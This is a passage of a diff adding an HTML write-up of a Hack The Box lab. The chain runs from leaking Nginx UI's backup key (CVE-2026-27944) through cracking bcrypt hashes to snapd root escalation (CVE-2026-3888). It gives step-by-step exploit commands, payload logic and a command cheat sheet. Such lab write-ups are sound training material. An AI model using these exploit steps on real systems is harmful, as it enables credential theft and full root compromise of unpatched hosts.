+# version-BWPlJ0ga.js
+# version-CdjIlmL0.js
+
+# Extract the version number
+curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
+# const t=&quot;2.3.2&quot;; ...
+</code></pre>
+<p><strong>Version: Nginx UI 2.3.2</strong></p>
+<h3>API Endpoint Fuzzing</h3>
+<pre><code class="language-bash">feroxbuster -u http://admin.snapped.htb/api
+</code></pre>
+<p><strong>Key findings:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Status</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/api/install</code></td>
+<td>200</td>
+<td>Returns <code>{&quot;lock&quot;:true,&quot;timeout&quot;:false}</code> — already installed</td>
+</tr>
+<tr>
+<td><code>/api/backup</code></td>
+<td>200</td>
+<td><strong>Returns a zip archive — no auth required!</strong></td>
+</tr>
+<tr>
+<td><code>/api/licenses</code></td>
+<td>200</td>
+<td>Long JSON with dependency license info</td>
+</tr>
+<tr>
+<td><code>/api/user</code>, <code>/api/users</code>, <code>/api/sites</code>, etc.</td>
+<td>403</td>
+<td>Require authentication</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>⚠️ <strong>Key finding:</strong> <code>/api/backup</code> is accessible without authentication and returns a binary file.</p>
+</blockquote>
+<hr>
+<h2>05 · CVE-2026-27944 — Unauthenticated Backup Decryption</h2>
+<h3>Vulnerability Description</h3>
+<p><strong>CVE-2026-27944</strong> (fixed in Nginx UI 2.3.3):</p>
+<blockquote>
+<p>The <code>/api/backup</code> endpoint is accessible without authentication and <strong>discloses the AES encryption keys in the <code>X-Backup-Security</code> response header</strong>. This allows unauthenticated access to a full system backup containing user credentials, SSL private keys, and nginx configs.</p>
+</blockquote>
+<h3>Step 1 — Recover the Encryption Key and IV</h3>
+<pre><code class="language-bash"># Use -v to see response headers
+curl http://admin.snapped.htb/api/backup -v -o backup.zip 2&gt;&amp;1 | grep X-Backup-Security
+# X-Backup-Security: v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=:xGJoMQ5IYESLQdSoYcwt3A==
+</code></pre>
+<p>The header contains two base64-encoded values separated by <code>:</code>:</p>
+<ul>
+<li><strong>First value</strong> = 32-byte AES-256 key</li>
+<li><strong>Second value</strong> = 16-byte IV (Initialization Vector)</li>
+</ul>
+<pre><code class="language-bash"># Extract raw hex key (32 bytes = AES-256)
+KEY=$(echo &quot;v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=&quot; | base64 -d | xxd -p -c 0)
+echo $KEY
+# bfa315c9ba5a249e8be03138b90963480779248560768c88d428fb453cb2795f
+
+# Extract raw hex IV (16 bytes = AES block size)
+IV=$(echo &quot;xGJoMQ5IYESLQdSoYcwt3A==&quot; | base64 -d | xxd -p -c 0)
+echo $IV
+# c46268310e4860448b41d4a861cc2ddc
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Important:</strong> The key and IV change on every request. You must use the key/IV from the <strong>same request</strong> that downloads the archive — they are generated fresh per-request.</p>
+</blockquote>
+<h3>Step 2 — Download and Extract the Outer Archive</h3>
+<pre><code class="language-bash">curl http://admin.snapped.htb/api/backup -v -o backup.zip 2&gt;&amp;1 | grep X-Backup-Security
+# (copy the key and IV from this output)
+
+unzip backup.zip -d backup/
+# Extracts:
+# backup/hash_info.txt    (encrypted)
+# backup/nginx-ui.zip     (encrypted)
+# backup/nginx.zip        (encrypted)
+
+file backup/*
+# All show as &quot;data&quot; — encrypted content looks like random noise to &#39;file&#39;
+</code></pre>
+<h3>Step 3 — Decrypt with OpenSSL AES-256-CBC</h3>
+<pre><code class="language-bash">cd backup/
+
+# Decrypt hash_info.txt
+openssl enc -aes-256-cbc -d \
+    -in hash_info.txt -out hash_info_dec.txt \
+    -K $KEY -iv $IV
+
+cat hash_info_dec.txt
+# nginx-ui_hash: 7541765e19689be9ab20b6c3d0b3190287a6ec2c1332f463641b6c4bdca1040e
+# nginx_hash: 71bc59f8eaf4a28ebd166fefdc28774340a6714db577ec633cd37ccb56e9b09d
+# timestamp: 20260329-183639
+# version: 2.3.2
+
+# Decrypt nginx.zip
+openssl enc -aes-256-cbc -d \
+    -in nginx.zip -out nginx_dec.zip \
+    -K $KEY -iv $IV
+
+# Decrypt nginx-ui.zip
+openssl enc -aes-256-cbc -d \
+    -in nginx-ui.zip -out nginx-ui_dec.zip \
+    -K $KEY -iv $IV
+
+# Verify integrity against hash_info.txt
+sha256sum *_dec.zip
+</code></pre>
+<h3>Step 4 — Inspect Decrypted Backups</h3>
+<h4>nginx backup</h4>
+<pre><code class="language-bash">unzip nginx_dec.zip -d nginx/
+
+# Key files:
+cat nginx/sites-available/snapped
+# Web root: /var/www/html/snapped
+
+cat nginx/sites-available/nginx-ui
+# Nginx UI proxies to: http://127.0.0.1:9000
+
+# Admin email found in app.ini:
+grep -i mail nginx-ui/app.ini
+# admin@test.htb
+</code></pre>
+<h4>nginx-ui backup</h4>
+<pre><code class="language-bash">unzip nginx-ui_dec.zip -d nginx-ui/
+# Extracts: app.ini, database.db
+
+file nginx-ui/database.db
+# SQLite 3.x database
+</code></pre>
+<hr>
+<h2>06 · Extracting Credentials from SQLite Database</h2>
+<pre><code class="language-bash">sqlite3 nginx-ui/database.db
+
+# List all tables
+.tables
+
+# Query users table
+.headers on
+select id, name, password from users;
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>id | name     | password
+1  | admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
+2  | jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
+</code></pre>
+<p>Both are <strong>bcrypt</strong> hashes (prefix <code>$2a$10$</code>).</p>
+<h3>Crack with Hashcat</h3>
+<pre><code class="language-bash"># Save hashes to file
+cat hashes.txt
+# $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
+# $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
+
+# Crack with mode 3200 (straight bcrypt $2*$)
+hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
+</code></pre>
+<p><strong>Result:</strong></p>
+<ul>
+<li><code>jonathan</code>: <strong><code>linkinpark</code></strong> ✅ (cracked quickly)</li>
+<li><code>admin</code>: Not cracked in reasonable time</li>
+</ul>
+<blockquote>
+<p>💡 <strong>Hashcat mode 3200</strong> = straight bcrypt <code>$2*$</code> (Blowfish). Bcrypt is intentionally slow — GPU cracking helps significantly but is still slower than MD5/NTLM. Common passwords from rockyou.txt will crack; complex ones likely won&#39;t.</p>
+</blockquote>
+<hr>
+<h2>07 · Shell as jonathan</h2>
+<h3>Validate Credentials</h3>
+<pre><code class="language-bash"># Quick credential validation across protocols
+netexec ssh snapped.htb -u jonathan -p linkinpark
+# SSH 10.129.17.88 [+] jonathan:linkinpark  Linux - Shell access!
+</code></pre>
+<h3>SSH Login</h3>
+<pre><code class="language-bash">ssh jonathan@snapped.htb
+# Password: linkinpark
+
+jonathan@snapped:~$ cat user.txt
+090aa3c5************************
+</code></pre>
+<hr>
+<h2>08 · Privilege Escalation Enumeration</h2>
+<h3>Basic Checks</h3>
+<pre><code class="language-bash"># Sudo rights
+sudo -l
+# Sorry, user jonathan may not run sudo on snapped.
+
+# Group membership
+id
+# uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
+# No special groups (docker, lxd, disk, etc.)
+
+# Other users with shells
+cat /etc/passwd | grep &#39;sh$&#39;
+# root and jonathan only
+
+# SUID binaries
+find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<h3>OS and Kernel</h3>
+<pre><code class="language-bash">cat /etc/os-release
+# PRETTY_NAME=&quot;Ubuntu 24.04.4 LTS&quot;
+
+uname -a
+# Linux snapped 6.17.0-19-generic #19~24.04.2-Ubuntu SMP ... Fri Mar 6 ...
+# Kernel from March 6 — very recent (released ~3 weeks before this box)
+</code></pre>
+<h3>Snapd Service</h3>
+<pre><code class="language-bash">snap version
+# snap    2.63.1+24.04
+# snapd   2.63.1+24.04
+# series  16
+# ubuntu  24.04
+# kernel  6.17.0-19-generic
+
+systemctl list-units --type=service --state=running | grep snap
+# snapd.service  loaded active running  Snap Daemon
+</code></pre>
+<h3>snap-confine Binary</h3>
+<pre><code class="language-bash">ls -l /usr/lib/snapd/snap-confine
+# -rwsr-xr-x 1 root root 159016 Aug 20 2024 /usr/lib/snapd/snap-confine
+# ^ SetUID root — this is the exploitation target
+</code></pre>
+<h3>systemd-tmpfiles Timer (Key Discovery)</h3>
+<pre><code class="language-bash"># Default tmpfiles cleanup timer
+systemctl list-timers systemd-tmpfiles-clean
+# Runs every minute on this box
+
+# Check the tmpfiles config
+cat /usr/lib/tmpfiles.d/tmp.conf
+# D /tmp 1777 root root 4m    ← 4 minutes! (default is 30 days)
+</code></pre>
+<blockquote>
+<p>💡 <strong>Critical observation:</strong> The <code>/tmp</code> cleanup age has been reduced from the default 30 days to <strong>4 minutes</strong> on this machine. This makes CVE-2026-3888 exploitable in minutes rather than requiring a real 30-day wait.</p>
+</blockquote>
+<hr>
+<h2>09 · CVE-2026-3888 — snapd Race Condition LPE</h2>
+<h3>Vulnerability Description</h3>
+<p><strong>CVE-2026-3888</strong> (fixed in snapd 2.73):</p>
+<blockquote>
+<p>Local privilege escalation in snapd on Linux allows local attackers to get root privilege by re-creating snap&#39;s private <code>/tmp</code> directory when <code>systemd-tmpfiles</code> is configured to automatically clean up this directory.</p>
+</blockquote>
+<p><strong>Affected:</strong> Ubuntu 16.04 LTS, 18.04 LTS, 20.04 LTS, 22.04 LTS, 24.04 LTS (snapd &lt; 2.73)</p>
+<p><strong>Reported by:</strong> Qualys</p>
+<h3>How It Works</h3>
+<p>The vulnerability exploits an interaction between two system components:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>snap-confine</code></td>
+<td>SetUID-root binary that sets up execution environments for snap apps</td>
+</tr>
+<tr>
+<td><code>systemd-tmpfiles</code></td>
+<td>Cleanup daemon that deletes old temp files/dirs</td>
+</tr>
+</tbody></table>
+<p><strong>Attack flow:</strong></p>
+<ol>
+<li><code>snap-confine</code> uses <code>/tmp/.snap/</code> as a staging area for <strong>mount mimics</strong> — it copies directory trees there so it can create writable mountpoints in read-only snap paths</li>
+<li><code>systemd-tmpfiles</code> cleans up <code>/tmp/.snap</code> when it&#39;s older than the configured threshold (4m here, 30d on stock Ubuntu)</li>
+<li>When <code>/tmp/.snap</code> is gone, <code>snap-confine</code> recreates it from scratch on the next snap launch</li>
+<li>The attacker <strong>wins the race</strong> by atomically swapping (<code>rename()</code>) a legitimate <code>.snap</code> directory with a poisoned one <strong>after</strong> <code>snap-confine</code> passes its validation check but <strong>before</strong> it performs the bind-mount</li>
+<li><code>snap-confine</code> (running as root) bind-mounts the attacker&#39;s poisoned files into the namespace</li>
+<li>The payload replaces <code>ld-linux-x86-64.so.2</code> (the dynamic linker) — when this is loaded by the SetUID <code>snap-confine</code>, it runs attacker code <strong>as root</strong></li>
+</ol>
+<h3>Exploit Preparation</h3>
+<pre><code class="language-bash"># Clone TheCyberGeek&#39;s PoC (co-author of this box)
+git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
+
+cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
+
+# Choose the SUID variant (Ubuntu 24.04 uses SetUID snap-confine, not capabilities)
+# Compile the main exploit
+gcc -O2 -static -o exploit exploit_suid.c
+
+# Compile the malicious shared object (replaces the dynamic linker)
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+
+# Upload to target
+sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/tmp/
+</code></pre>
+<h3>The Payload Explained (<code>librootshell_suid.c</code>)</h3>
+<p>The payload replaces the dynamic linker (<code>ld-linux-x86-64.so.2</code>). Since it IS the linker, it cannot use the C standard library — everything is raw assembly syscalls:</p>
+<pre><code class="language-c">void _start(void) {
+    // syscall: setreuid(0, 0)  — set UID to root
+    // syscall: setregid(0, 0)  — set GID to root
+    // syscall: execve(&quot;/tmp/sh&quot;, {&quot;/tmp/sh&quot;, NULL}, NULL)  — launch shell
+}
+</code></pre>
+<p>When <code>snap-confine</code> (SetUID root) loads this fake linker, the process already runs as root (SUID), so <code>setreuid(0,0)</code> locks in root, then it executes <code>/tmp/sh</code>.</p>
+<h3>Run the Exploit (7 Phases)</h3>
+<pre><code class="language-bash">jonathan@snapped:/tmp$ ./exploit librootshell.so
+</code></pre>
+<p><strong>Phase 1 — Enter Firefox snap sandbox</strong></p>
+<p>Creates a long-running process inside the Firefox snap mount namespace (<code>sleep 86400</code>). This gives the exploit a handle to the namespace.</p>
+<pre><code class="language-bash"># Verify the sandbox process was created
+ls -la /proc/&lt;FIREFOX_PID&gt;/root/tmp/
+# Shows .snap directory created by snap-confine
+</code></pre>
+<p><strong>Phase 2 — Wait for systemd-tmpfiles to delete <code>/tmp/.snap</code></strong></p>
+<p>On this box: ~4 minutes. On stock Ubuntu 24.04: up to 30 days.</p>
+<pre><code class="language-bash"># Monitor the directory — wait for it to disappear
+ls -la /proc/&lt;FIREFOX_PID&gt;/root/tmp/
+# .snap will be gone once cleanup runs
+</code></pre>
+<p><strong>Phase 3 — Destroy cached mount namespace</strong></p>
+<p>Forces <code>snap-confine</code> to rebuild the namespace fresh (instead of reusing a cached one that would ignore the poisoned <code>.snap</code>):</p>
+<pre><code>[Phase 3] Destroying cached mount namespace...
+cannot perform operation: mount --rbind /dev ...: No such file or directory
+[+] Namespace destroyed.
+</code></pre>
+<p><strong>Phase 4 — Win the race condition</strong></p>
+<pre><code>[Phase 4] Setting up and running the race...
+[*]   285 entries copied to exchange directory
+[*]   Starting race...
+[!]   TRIGGER — swapping directories...
+[+]   SWAP DONE — race won!
+[*]   ld-linux in namespace: jonathan:jonathan 755
+</code></pre>
+<ul>
+<li>Creates a <strong>legitimate</strong> <code>.snap</code> directory tree that passes <code>snap-confine</code>&#39;s validation</li>
+<li>Launches <code>snap-confine</code></li>
+<li>At the precise moment between validation and bind-mount, atomically swaps (<code>rename()</code>) the legitimate <code>.snap</code> with the <strong>poisoned one</strong> containing <code>librootshell.so</code> as <code>ld-linux-x86-64.so.2</code></li>
+<li><code>snap-confine</code> bind-mounts the poisoned content into the namespace as root</li>
+</ul>
+<pre><code class="language-bash"># Verify the poisoned linker is in place
+md5sum /proc/&lt;PID&gt;/root/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+md5sum /tmp/librootshell.so
+# Should match
+</code></pre>
+<p><strong>Phase 5 — Inject payload into the poisoned namespace</strong></p>
+<p>Places a statically linked <code>busybox</code> and a shell script <code>/tmp/sh</code> into the namespace. The shell script is what <code>/tmp/sh</code> executes after <code>librootshell.so</code> runs:</p>
+<pre><code class="language-bash"># The /tmp/sh script inside the namespace:
+# #!/tmp/busybox sh
+# /tmp/busybox cp /bin/bash /var/snap/firefox/common/bash
+# /tmp/busybox chmod 04755 /var/snap/firefox/common/bash
+</code></pre>
+<p>This copies <code>/bin/bash</code> to a path that&#39;s writable from inside the snap namespace but accessible from the host, and sets it <strong>SetUID root</strong>.</p>
+<p><strong>Why statically linked binaries?</strong> The dynamic linker has been replaced with the payload — no dynamic libraries can be loaded. Only <code>busybox</code> (statically linked) works.</p>
+<p><strong>Phase 6 — Trigger the SetUID snap-confine chain</strong></p>
+<pre><code>[Phase 6] Triggering root via SUID snap-confine...
+[*]   snap-confine -&gt; snap-confine (SUID trigger)
+[*]   Exit status: 0
+</code></pre>
+<p>Full chain: <code>snap-confine</code> (SUID root) → loads <code>ld-linux</code> → <code>librootshell.so</code> → <code>setreuid(0,0)</code> → <code>execve(&quot;/tmp/sh&quot;)</code> → copies SUID bash.</p>
+<p><strong>Phase 7 — Verify and launch root shell</strong></p>
+<pre><code>[Phase 7] Verifying...
+[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
+================================================================
+  ROOT SHELL: /var/snap/firefox/common/bash -p
+================================================================
+
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+b427e509************************
+</code></pre>
+<pre><code class="language-bash"># Alternatively, run the SUID bash manually
+/var/snap/firefox/common/bash -p
+# -p preserves effective UID (required to keep root when running SUID bash)
+</code></pre>
+<hr>
+<h2>Key Concepts &amp; Analyst Notes</h2>
+<h3>CVE-2026-27944 — Nginx UI Backup Key Disclosure</h3>
+<p><strong>Vulnerability class:</strong> Unauthenticated sensitive data exposure + cryptographic key disclosure</p>
+<p><strong>What to look for:</strong></p>
+<ul>
+<li><code>X-Backup-Security</code> header in HTTP response from <code>/api/backup</code></li>
+<li>Format: <code>&lt;base64_key&gt;:&lt;base64_iv&gt;</code> — changes every request</li>
+<li>Cipher: AES-256-CBC</li>
+</ul>
+<p><strong>Decryption with openssl:</strong></p>
+<pre><code class="language-bash"># Get key and IV from a single request
+curl -v http://admin.snapped.htb/api/backup -o backup.zip 2&gt;&amp;1 | grep X-Backup-Security
+
+# Decode key (32 bytes → 64 hex chars)
+KEY=$(echo &quot;&lt;base64_key&gt;&quot; | base64 -d | xxd -p -c 0)
+
+# Decode IV (16 bytes → 32 hex chars)
+IV=$(echo &quot;&lt;base64_iv&gt;&quot; | base64 -d | xxd -p -c 0)
+
+# Decrypt any AES-256-CBC file
+openssl enc -aes-256-cbc -d -in &lt;encrypted_file&gt; -out &lt;output_file&gt; -K $KEY -iv $IV
+</code></pre>
+<blockquote>
+<p>⚠️ Key and IV are fresh per-request — the downloaded archive and the key header must come from the same HTTP request. Use a single <code>curl -o</code> command.</p>
+</blockquote>
+<hr>
+<h3>CVE-2026-3888 — snapd Race Condition (snap-confine + systemd-tmpfiles)</h3>
+<p><strong>Vulnerability class:</strong> Race condition (TOCTOU) in SetUID binary leading to local privilege escalation</p>
+<p><strong>Preconditions:</strong></p>
+<ul>
+<li><code>snap</code> is installed and running (snapd service active)</li>
+<li><code>snap-confine</code> is SetUID root: <code>-rwsr-xr-x</code></li>
+<li><code>systemd-tmpfiles</code> is configured to clean <code>/tmp</code> (with any age — default 30 days, this box 4 minutes)</li>
+<li>At least one snap application installed (Firefox, etc.)</li>
+</ul>
+<p><strong>Detection commands:</strong></p>
+<pre><code class="language-bash"># Check snap-confine permissions
+ls -l /usr/lib/snapd/snap-confine
+# Must be -rwsr-xr-x (SUID)
+
+# Check snap version (vulnerable: &lt; 2.73)
+snap version
+
+# Check tmpfiles cleanup age
+cat /usr/lib/tmpfiles.d/tmp.conf
+# D /tmp 1777 root root &lt;AGE&gt;   ← relevant line
+
+# Check how often cleanup runs
+systemctl list-timers systemd-tmpfiles-clean
+</code></pre>
+<p><strong>Exploit reference:</strong> <a href="https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE">TheCyberGeek/CVE-2026-3888</a></p>
+<p><strong>Two exploit variants:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Variant</th>
+<th>Use When</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exploit_suid.c</code> / <code>librootshell_suid.c</code></td>
+<td><code>snap-confine</code> is SetUID root (<code>-rwsr-xr-x</code>) — Ubuntu 24.04 default</td>
+</tr>
+<tr>
+<td><code>exploit_caps.c</code> / <code>librootshell_caps.c</code></td>
+<td><code>snap-confine</code> uses Linux capabilities instead of SUID</td>
+</tr>
+</tbody></table>
+<pre><code class="language-bash"># Check which variant is needed
+ls -l /usr/lib/snapd/snap-confine
+# -rwsr-xr-x → SUID variant
+# -rwxr-xr-x → capabilities variant (check with getcap)
+getcap /usr/lib/snapd/snap-confine
+</code></pre>
+<hr>
+<h3>Version Detection in JavaScript SPA</h3>
+<p>When a web application loads as a Single-Page App (SPA), the version number is often embedded in JavaScript files:</p>
+<pre><code class="language-bash"># Step 1: Find the main JS bundle
+curl http://&lt;TARGET&gt;/ -s | grep -P &#39;.js\b&#39;
+
+# Step 2: Find version-related files inside the bundle
+curl http://&lt;TARGET&gt;/assets/&lt;BUNDLE&gt;.js -s | grep -oP &#39;version[-\w]*\.js&#39;
+
+# Step 3: Fetch the version file
+curl http://&lt;TARGET&gt;/assets/&lt;VERSION_FILE&gt;.js
+</code></pre>
+<hr>
+<h3>API Endpoint Discovery on SPAs</h3>
+<p>Most SPA backends expose REST APIs. Use Burp to passively collect API calls, then brute-force:</p>
+<pre><code class="language-bash"># After loading the page in Burp, examine API endpoints found
+feroxbuster -u http://&lt;TARGET&gt;/api
+
+# Look specifically for 200 responses without auth
+# 403 = endpoint exists but requires auth
+# 200 = unauthenticated access — enumerate further
+</code></pre>
+<hr>
+<h3>bcrypt Hash Cracking</h3>
+<pre><code class="language-bash"># Mode 3200 = straight bcrypt $2*$ (most common)
+hashcat -m 3200 hashes.txt rockyou.txt
+
+# Other bcrypt variants (less common)
+hashcat -m 25600 hashes.txt wordlist.txt   # bcrypt(md5($pass))
+hashcat -m 25800 hashes.txt wordlist.txt   # bcrypt(sha1($pass))
+hashcat -m 30600 hashes.txt wordlist.txt   # bcrypt(sha256($pass))
+
+# bcrypt is slow — start autodetect to confirm format
+hashcat hashes.txt wordlist.txt
+# Shows suggested modes when ambiguous
+</code></pre>
+<blockquote>
+<p>💡 Bcrypt with cost factor <code>$2a$10$</code> is significantly slower than MD5 or NTLM. Prioritize high-value targets (service accounts, admin accounts) and use GPU acceleration. Common passwords from rockyou.txt will crack; complex ones likely won&#39;t in reasonable time.</p>
+</blockquote>
+<hr>
+<h3>SQLite Database Forensics</h3>
+<pre><code class="language-bash"># Open and enumerate
+sqlite3 database.db
+
+# List all tables
+.tables
+
+# Enable column headers
+.headers on
+
+# Describe table schema
+.schema users
+
+# Dump all data from a table
+select * from users;
+
+# Export table as CSV
+.mode csv
+.output users.csv
+select * from users;
+.output stdout
+
+# Search for keywords across all tables
+.dump | grep -i &quot;password\|hash\|secret\|token&quot;
+</code></pre>
+<hr>
+<h3>Quick Reference — Commands Used</h3>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Subdomain fuzzing</td>
+<td><code>ffuf -H &#39;Host: FUZZ.&lt;DOMAIN&gt;&#39; -u http://&lt;IP&gt; -w &lt;WORDLIST&gt; -ac</code></td>
+</tr>
+<tr>
+<td>Nginx UI version</td>
+<td><code>curl &lt;URL&gt;/assets/&lt;version_file&gt;.js</code></td>
+</tr>
+<tr>
+<td>Download backup with verbose headers</td>
+<td><code>curl -v -o backup.zip http://admin.snapped.htb/api/backup</code></td>
+</tr>
+<tr>
+<td>Extract AES key as hex</td>
+<td><code>echo &lt;b64_key&gt; | base64 -d | xxd -p -c 0</code></td>
+</tr>
+<tr>
+<td>Decrypt AES-256-CBC</td>
+<td><code>openssl enc -aes-256-cbc -d -in &lt;in&gt; -out &lt;out&gt; -K &lt;KEY_HEX&gt; -iv &lt;IV_HEX&gt;</code></td>
+</tr>
+<tr>
+<td>Verify SHA256 hash</td>
+<td><code>sha256sum &lt;file&gt;</code></td>
+</tr>
+<tr>
+<td>Query SQLite users</td>
+<td><code>sqlite3 db.db &quot;select name, password from users;&quot;</code></td>
+</tr>
+<tr>
+<td>Crack bcrypt</td>
+<td><code>hashcat -m 3200 hashes.txt rockyou.txt</code></td>
+</tr>
+<tr>
+<td>Validate SSH creds</td>
+<td><code>netexec ssh &lt;HOST&gt; -u &lt;USER&gt; -p &lt;PASS&gt;</code></td>
+</tr>
+<tr>
+<td>Check snap-confine SUID</td>
+<td><code>ls -l /usr/lib/snapd/snap-confine</code></td>
+</tr>
+<tr>
+<td>Check snap version</td>
+<td><code>snap version</code></td>
+</tr>
+<tr>
+<td>Check tmpfiles cleanup</td>
+<td><code>cat /usr/lib/tmpfiles.d/tmp.conf</code></td>
+</tr>
+<tr>
+<td>Run exploit</td>
+<td><code>./exploit librootshell.so</code></td>
+</tr>
+<tr>
+<td>Get root shell</td>
+<td><code>/var/snap/firefox/common/bash -p</code></td>
+</tr>
+</tbody></table>
+<hr>
+
+  </main>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       FOOTER
+       EDIT: brand name, link, and year as needed
+  ═══════════════════════════════════════════════════════════ -->
+  <footer class="cp-footer">
+    <span>© 2026 Motasem Notes</span>
+    <span class="cp-footer-sig">[ SYS.INTEGRITY: OK ]</span>
+    <a href="https://motasem-notes.net" target="_blank">motasem-notes.net</a>
+  </footer>
+
+
+  <!-- Live clock in topbar -->
+  <script>
+    (function () {
+      const el = document.getElementById('cp-clock');
+      if (!el) return;
+      function tick() {
+        const now = new Date();
+        const hh  = String(now.getHours()).padStart(2,'0');
+        const mm  = String(now.getMinutes()).padStart(2,'0');
+        const ss  = String(now.getSeconds()).padStart(2,'0');
+        el.textContent = `SYS://${hh}:${mm}:${ss}`;
+      }
+      tick();
+      setInterval(tick, 1000);
+    })();
+  </script>
+
+</body>
+</html>
